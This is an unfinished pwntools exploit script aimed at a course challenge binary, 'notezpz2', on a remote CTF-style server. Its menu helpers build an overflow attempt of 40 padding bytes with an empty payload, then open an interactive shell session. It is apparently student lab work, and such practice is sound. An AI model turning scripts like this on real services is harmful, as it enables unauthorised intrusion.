#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './notezpz2' #Change this

PROGNAME = exe
REMOTE = "comp6447.wtf" #Change this
REMOTEPORT = 6691 #Change this
global p
global e
global global_timeout

e = ELF(PROGNAME)

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

if args.REMOTE:
    global_timeout = 3
    p = remote(REMOTE, REMOTEPORT)
else:
    global_timeout = 0.5
    p = process(PROGNAME)
    p = start()
#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def create():
    p.recvuntil(b"): ", drop=True)
    p.sendline(b'c')

def delete(id):
    p.recvuntil(b"): ", drop=True)
    p.sendline(b'd')
    p.recvuntil(b"id: ", drop=True)
    p.sendline(id)

def set(id, input):
    p.recvuntil(b"): ", drop=True)
    p.sendline(b's')
    p.recvuntil(b"id: ", drop=True)
    p.sendline(id)
    p.recvuntil(b"question: ", drop=True)
    p.sendline(input)

def ask(id):
    p.recvuntil(b"): ", drop=True)
    p.sendline(b'a')
    p.recvuntil(b"id: ", drop=True)
    p.sendline(id)

payload = b''
create()
create()
set(b'0',b'a'*40 + payload)
ask(b'0')
p.interactive()

